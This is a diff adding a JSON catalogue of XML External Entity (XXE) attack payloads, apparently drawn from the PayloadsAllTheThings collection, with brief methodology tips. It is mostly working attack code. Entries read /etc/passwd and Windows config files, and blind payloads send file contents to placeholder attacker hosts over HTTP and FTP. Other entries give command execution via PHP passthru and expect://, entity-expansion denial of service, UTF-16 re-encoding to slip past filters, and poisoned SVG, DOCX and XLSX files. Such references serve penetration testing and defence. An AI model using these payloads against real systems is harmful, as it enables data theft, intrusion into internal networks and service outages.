@@ -1,0 +1,397 @@
+{
+  "category": "XXE Injection",
+  "source": "PayloadsAllTheThings/XXE Injection/",
+  "entries": [
+    {
+      "subcategory": "Detection",
+      "title": "What internal and external entities are",
+      "language": "text",
+      "tags": ["detection", "methodology", "entity"],
+      "body": "Internal Entity: declared inside the DTD.\n  Syntax: <!ENTITY entity_name \"entity_value\">\n\nExternal Entity: declared externally, pulls in a resource. Recognizable by SYSTEM.\n  Syntax: <!ENTITY entity_name SYSTEM \"entity_value\">\n\nSYSTEM and PUBLIC are almost synonyms - if SYSTEM is blocked by the WAF, try PUBLIC:\n  <!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">\n  <!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\">\n\nTip: in a request with an XML body, set the header Content-Type: application/xml."
+    },
+    {
+      "subcategory": "Detection",
+      "title": "Basic test for entity parsing",
+      "language": "xml",
+      "tags": ["detection", "entity"],
+      "body": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>"
+    },
+    {
+      "subcategory": "Detection",
+      "title": "Entity types in XML",
+      "language": "table",
+      "tags": ["detection", "entity", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Type", "Prefix", "Where applicable"],
+          "rows": [
+            ["General entity", "&name;", "Inside the content of the XML document"],
+            ["Parameter entity", "%name;", "Only inside the DTD"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "File read",
+      "title": "Classic XXE - reading /etc/passwd (one-liner)",
+      "language": "xml",
+      "tags": ["file-read", "classic", "linux"],
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "Classic XXE - reading /etc/passwd",
+      "language": "xml",
+      "tags": ["file-read", "classic", "linux"],
+      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ELEMENT data (#ANY)>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<data>&file;</data>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "Classic XXE - variant with ELEMENT ANY",
+      "language": "xml",
+      "tags": ["file-read", "classic", "linux"],
+      "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n  <!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "Classic XXE - reading a Windows file (boot.ini)",
+      "language": "xml",
+      "tags": ["file-read", "classic", "windows"],
+      "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "Classic XXE in Base64 (data:// wrapper)",
+      "language": "xml",
+      "tags": ["file-read", "base64", "data-wrapper"],
+      "body": "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "PHP wrapper - reading the source in Base64",
+      "language": "xml",
+      "tags": ["file-read", "php-wrapper", "source-disclosure"],
+      "body": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>\n<contacts>\n  <contact>\n    <name>Jean &xxe; Dupont</name>\n    <phone>00 11 22 33 44</phone>\n    <address>42 rue du CTF</address>\n    <zipcode>75000</zipcode>\n    <city>Paris</city>\n  </contact>\n</contacts>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "PHP wrapper - Base64 + reading over HTTP",
+      "language": "xml",
+      "tags": ["file-read", "php-wrapper", "ssrf"],
+      "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" >\n]>\n<foo>&xxe;</foo>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "XInclude - when you cannot modify the DOCTYPE",
+      "language": "xml",
+      "tags": ["file-read", "xinclude", "bypass"],
+      "body": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "XSLT - reading a file via document()",
+      "language": "xml",
+      "tags": ["file-read", "xslt"],
+      "body": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:copy-of select=\"document('/etc/passwd')\"/></xsl:template></xsl:stylesheet>"
+    },
+    {
+      "subcategory": "File read",
+      "title": "XSLT - RCE via php:function (if PHP-EXSLT is enabled)",
+      "language": "xml",
+      "tags": ["rce", "xslt", "php"],
+      "body": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('passthru','ls -la')\"/></xsl:template></xsl:stylesheet>"
+    },
+    {
+      "subcategory": "SSRF via XXE",
+      "title": "SSRF - reaching an internal service",
+      "language": "xml",
+      "tags": ["ssrf", "internal"],
+      "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >\n]>\n<foo>&xxe;</foo>"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "Tip: when there is no output - blind and OOB",
+      "language": "text",
+      "tags": ["blind", "oob", "methodology"],
+      "body": "If the result is not displayed on the page - the data can still be extracted out-of-band.\nThe easiest way to verify blind XXE: make the parser hit an endpoint you control (DNS/HTTP callback).\nThen you escalate to exfiltrating the file content via an external DTD or error-based.\n\nFTP instead of HTTP lets you pull entire files (over HTTP often only the first line comes back)."
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "Basic Blind XXE - parameter entity",
+      "language": "xml",
+      "tags": ["blind", "oob", "callback"],
+      "body": "<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> %ext;\n]>\n<r></r>"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "Basic Blind XXE - general entity (callback)",
+      "language": "xml",
+      "tags": ["blind", "oob", "callback"],
+      "body": "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>\n<root>&test;</root>"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "Blind XXE - sending /etc/passwd to your server",
+      "language": "xml",
+      "tags": ["blind", "oob", "exfiltration"],
+      "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >\n<!ENTITY callhome SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/?%xxe;\">\n]\n>\n<foo>&callhome;</foo>"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "OOB XXE - external DTD (Yunusov, 2013)",
+      "language": "xml",
+      "tags": ["blind", "oob", "external-dtd"],
+      "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE data SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\">\n<data>&send;</data>\n\nFile stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\n<!ENTITY % file SYSTEM \"file:///sys/power/image_size\">\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>\">\n%all;"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "OOB XXE - external DTD + PHP filter (Base64)",
+      "language": "xml",
+      "tags": ["blind", "oob", "external-dtd", "php-wrapper"],
+      "body": "<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://10.10.10.10/dtd.xml\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n\nFile stored on http://10.10.10.10/dtd.xml\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>\">"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "XXE via DTD file only (for example, MITM)",
+      "language": "dtd",
+      "tags": ["blind", "oob", "dtd-only", "mitm"],
+      "body": "<!-- Load the contents of a sensitive file into a variable -->\n<!ENTITY % payload SYSTEM \"file:///etc/passwd\">\n<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->\n<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x=%payload;\">'>\n%param1;\n%external;"
+    },
+    {
+      "subcategory": "Blind / OOB exfiltration",
+      "title": "OOB XXE via Apache Karaf (CVE-2018-11788)",
+      "language": "xml",
+      "tags": ["blind", "oob", "cve", "karaf"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]\n<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">\n    <feature name=\"deployer\" version=\"2.0\" install=\"auto\">\n    </feature>\n</features>",
+      "meta": {
+        "note": "Affects Apache Karaf <= 4.2.1 and <= 4.1.6. The XML file is dropped into the deploy folder."
+      }
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Confirming error-based - file name in the error",
+      "language": "xml",
+      "tags": ["error-based", "detection"],
+      "body": "<!DOCTYPE root [\n    <!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">\n    %local_dtd;\n]>\n<root></root>"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Error-based via a remote DTD",
+      "language": "xml",
+      "tags": ["error-based", "external-dtd", "exfiltration"],
+      "body": "<?xml version=\"1.0\" ?>\n<!DOCTYPE message [\n    <!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/ext.dtd\">\n    %ext;\n]>\n<message></message>"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Contents of ext.dtd for error-based",
+      "language": "dtd",
+      "tags": ["error-based", "external-dtd", "exfiltration"],
+      "body": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Contents of ext.dtd - alternative variant",
+      "language": "dtd",
+      "tags": ["error-based", "external-dtd", "exfiltration"],
+      "body": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">\n%eval;\n%leak;"
+    },
+    {
+      "subcategory": "Error-based",
+      "title": "Tip: how error-based exfiltration works",
+      "language": "text",
+      "tags": ["error-based", "methodology"],
+      "body": "The idea: the file content is substituted into the path of a nonexistent file, the parser fails, and outputs that path (together with the data) in the error text.\n\n1. <!ENTITY % file SYSTEM \"file:///etc/passwd\"> - load the file into a parameter entity.\n2. <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> - &#x25; is the URL-encoded '%', needed to declare an entity inside an entity.\n3. %eval; - defines the error entity.\n4. %error; - a reference to a nonexistent file whose path has the contents of /etc/passwd baked in -> an error with the data.\n\nWorks only if the application returns the parser error text to the user."
+    },
+    {
+      "subcategory": "Error-based (local DTD)",
+      "title": "Tip: the local DTD trick",
+      "language": "text",
+      "tags": ["error-based", "local-dtd", "methodology"],
+      "body": "If only error-based exfiltration is available and you cannot load your own remote DTD - use a DTD that already exists on the system. You redefine a parameter entity in it and pull out the file via concatenation.\n\nLinux: look for DTDs with the command `locate .dtd`. Often present:\n  /usr/share/xml/fontconfig/fonts.dtd\n  /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\n  /usr/share/xml/svg/svg10.dtd\n  /usr/share/xml/svg/svg11.dtd\n  /usr/share/yelp/dtd/docbookx.dtd\n\nIn fonts.dtd on line 148 there is a redefinable entity %constant.\nWindows: cim20.dtd at the path C:\\Windows\\System32\\wbem\\xml\\cim20.dtd.\nThe GoSecure/dtd-finder tool helps find local DTDs and generate a payload."
+    },
+    {
+      "subcategory": "Error-based (local DTD)",
+      "title": "Linux - local DTD fonts.dtd (reading /etc/passwd)",
+      "language": "xml",
+      "tags": ["error-based", "local-dtd", "linux", "file-read"],
+      "body": "<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">\n    <!ENTITY % constant 'aaa)>\n            <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n            <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">\n            &#x25;eval;\n            &#x25;error;\n            <!ELEMENT aa (bb'>\n    %local_dtd;\n]>\n<message>Text</message>"
+    },
+    {
+      "subcategory": "Error-based (local DTD)",
+      "title": "Windows - local DTD cim20.dtd (reading a file)",
+      "language": "xml",
+      "tags": ["error-based", "local-dtd", "windows", "file-read"],
+      "body": "<!DOCTYPE doc [\n    <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">\n    <!ENTITY % SuperClass '>\n        <!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\">\n        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\">\n        &#x25;eval;\n        &#x25;error;\n      <!ENTITY test \"test\"'\n    >\n    %local_dtd;\n  ]><xxx>anything</xxx>"
+    },
+    {
+      "subcategory": "Error-based (local DTD)",
+      "title": "Windows - local DTD cim20.dtd (disclosing an HTTP response)",
+      "language": "xml",
+      "tags": ["error-based", "local-dtd", "windows", "ssrf"],
+      "body": "<!DOCTYPE doc [\n    <!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">\n    <!ENTITY % SuperClass '>\n        <!ENTITY &#x25; file SYSTEM \"https://erp.company.com\">\n        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\">\n        &#x25;eval;\n        &#x25;error;\n      <!ENTITY test \"test\"'\n    >\n    %local_dtd;\n  ]><xxx>anything</xxx>"
+    },
+    {
+      "subcategory": "DoS",
+      "title": "Warning about DoS attacks",
+      "language": "text",
+      "tags": ["dos", "warning"],
+      "body": "Warning: these attacks can take down the service or the entire server. Do not run them in production."
+    },
+    {
+      "subcategory": "DoS",
+      "title": "Billion Laughs - exponential entity expansion",
+      "language": "xml",
+      "tags": ["dos", "billion-laughs"],
+      "body": "<!DOCTYPE data [\n<!ENTITY a0 \"dos\" >\n<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">\n<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">\n<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">\n<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">\n]>\n<data>&a4;</data>"
+    },
+    {
+      "subcategory": "DoS",
+      "title": "YAML Bomb - a YAML equivalent of Billion Laughs",
+      "language": "text",
+      "tags": ["dos", "yaml"],
+      "body": "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\nf: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]"
+    },
+    {
+      "subcategory": "DoS",
+      "title": "Parameters Laugh - via parameter entities",
+      "language": "xml",
+      "tags": ["dos", "parameter-entity"],
+      "body": "<!DOCTYPE r [\n  <!ENTITY % pe_1 \"<!---->\">\n  <!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\">\n  <!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">\n  <!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">\n  %pe_4;\n]>\n<r/>"
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Tip: bypassing the WAF by changing the encoding",
+      "language": "text",
+      "tags": ["waf-bypass", "encoding", "methodology"],
+      "body": "XML parsers determine the encoding in 4 ways:\n  • HTTP Content-Type: charset=utf-8\n  • Byte Order Mark (BOM)\n  • the first bytes of the document: UTF-8 (3C 3F 78 6D), UTF-16BE (00 3C 00 3F), UTF-16LE (3C 00 3F 00)\n  • the XML declaration: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\nIf the WAF filters an ASCII payload - re-encode it to UTF-16, the parser will still understand it while the WAF signatures will miss."
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Re-encoding the payload to UTF-16 (iconv)",
+      "language": "bash",
+      "tags": ["waf-bypass", "encoding", "iconv"],
+      "body": "cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml"
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "BOM and encoding signatures",
+      "language": "table",
+      "tags": ["waf-bypass", "encoding", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Encoding", "BOM", "Example (hex)", "How it looks"],
+          "rows": [
+            ["UTF-8", "EF BB BF", "EF BB BF 3C 3F 78 6D 6C", "...<?xml"],
+            ["UTF-16BE", "FE FF", "FE FF 00 3C 00 3F 00 78 00 6D 00 6C", "...<.?.x.m.l"],
+            ["UTF-16LE", "FF FE", "FF FE 3C 00 3F 00 78 00 6D 00 6C 00", "..<.?.x.m.l."]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "XXE on JSON endpoints (changing the Content-Type)",
+      "language": "table",
+      "tags": ["waf-bypass", "json", "content-type"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Content-Type", "Request body"],
+          "rows": [
+            ["application/json", "{\"search\":\"name\",\"value\":\"test\"}"],
+            ["application/xml", "<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><search>name</search><value>data</value></root>"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "WAF Bypass",
+      "title": "Tip: swapping JSON for XML",
+      "language": "text",
+      "tags": ["waf-bypass", "json", "methodology"],
+      "body": "On a JSON endpoint, try switching the Content-Type from application/json to application/xml and resending the body as XML.\n\n• An XML document must have a single root element (<root>) - the parent of all the others.\n• The data also needs to be converted to XML, otherwise the server will return a parsing error, for example:\n  org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\n\nTool: NetSPI Content-Type Converter (a Burp extension)."
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "SVG - RCE via expect:// (if enabled)",
+      "language": "xml",
+      "tags": ["svg", "rce", "expect-wrapper"],
+      "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">\n    <image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>\n</svg>"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "SVG - classic XXE (reading a file)",
+      "language": "xml",
+      "tags": ["svg", "file-read", "classic"],
+      "body": "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>\n<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n   <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>\n</svg>"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "SVG - OOB via rasterization (xxe.svg)",
+      "language": "xml",
+      "tags": ["svg", "oob", "rasterization"],
+      "body": "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n<!ELEMENT svg ANY >\n<!ENTITY % sp SYSTEM \"http://10.10.10.10:8080/xxe.xml\">\n%sp;\n%param1;\n]>\n<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\">\n      <text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>\n      <rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>\n      <flowRoot font-size=\"15\">\n         <flowRegion>\n           <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/>\n         </flowRegion>\n         <flowDiv>\n            <flowPara>&exfil;</flowPara>\n         </flowDiv>\n      </flowRoot>\n</svg>"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "SVG rasterization - external xxe.xml (DTD)",
+      "language": "dtd",
+      "tags": ["svg", "oob", "external-dtd"],
+      "body": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>\">"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "SOAP - XXE inside CDATA",
+      "language": "xml",
+      "tags": ["soap", "oob", "cdata"],
+      "body": "<soap:Body>\n  <foo>\n  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://10.10.10.10:22/\"> %dtd;]><xxx/>]]>\n  </foo>\n</soap:Body>"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "Tip: XXE in DOCX/Office Open XML",
+      "language": "text",
+      "tags": ["docx", "ooxml", "methodology"],
+      "body": "The Office Open XML format is a zip archive. Inject the payload into any .xml inside:\n  • /_rels/.rels\n  • [Content_Types].xml\n  • the main document: /word/document.xml, /ppt/presentation.xml, /xl/workbook.xml\n\nAfter editing, repackage: zip -u xxe.docx \"[Content_Types].xml\"\n\nTools: BuffaloWill/oxml_xxe (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF), whitel1st/docem."
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "Tip: XXE in XLSX (repackaging the archive)",
+      "language": "text",
+      "tags": ["xlsx", "ooxml", "methodology"],
+      "body": "Extract: 7z x -oXXE xxe.xlsx\nAdd a blind-XXE payload to xl/workbook.xml (or xl/sharedStrings.xml).\nRepackage: cd XXE && zip -r -u ../xxe.xlsx *\n\nImportant: use zip -u, and NOT 7z u / 7za u / 7zz - they recompress differently, and many Excel libraries won't recognize the file. The correct signature (file XXE.xlsx) -> Microsoft Excel 2007+; a broken one -> Microsoft OOXML. Alternative: 7z a -tzip gives a correct signature.\n\nA remote DTD saves time: you build the document once and only change the DTD. FTP instead of HTTP lets you pull large files."
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "XLSX - payload in xl/workbook.xml",
+      "language": "xml",
+      "tags": ["xlsx", "ooxml", "oob"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>\n<cdl>&rrr;</cdl>\n<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "XLSX - payload in xl/sharedStrings.xml",
+      "language": "xml",
+      "tags": ["xlsx", "ooxml", "oob"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>\n<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>"
+    },
+    {
+      "subcategory": "Exotic formats",
+      "title": "XLSX - external xxe.dtd (FTP exfiltration)",
+      "language": "dtd",
+      "tags": ["xlsx", "ooxml", "external-dtd", "ftp"],
+      "body": "<!ENTITY % d SYSTEM \"file:///etc/passwd\">\n<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>\">"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Tools for XXE",
+      "language": "text",
+      "tags": ["tools", "reference"],
+      "body": "• staaldraad/xxeserv - a mini web server with FTP support for XXE payloads.\n  Run DTD + receive over FTP: xxeserv -o files.log -p 2121 -w -wd public -wp 8000\n• lc/230-OOB - an OOB XXE server for pulling out files over FTP (+ a generator at xxe.sh).\n• enjoiz/XXEinjector - automated XXE exploitation via direct and OOB methods.\n• BuffaloWill/oxml_xxe - embedding XXE into DOCX/XLSX/PPTX, ODT, SVG, PDF, JPG, GIF.\n• whitel1st/docem - embedding XXE/XSS into docx, odt, pptx, etc.\n• GoSecure/dtd-finder - finding local DTDs and generating payloads for them."
+    }
+  ]
+}
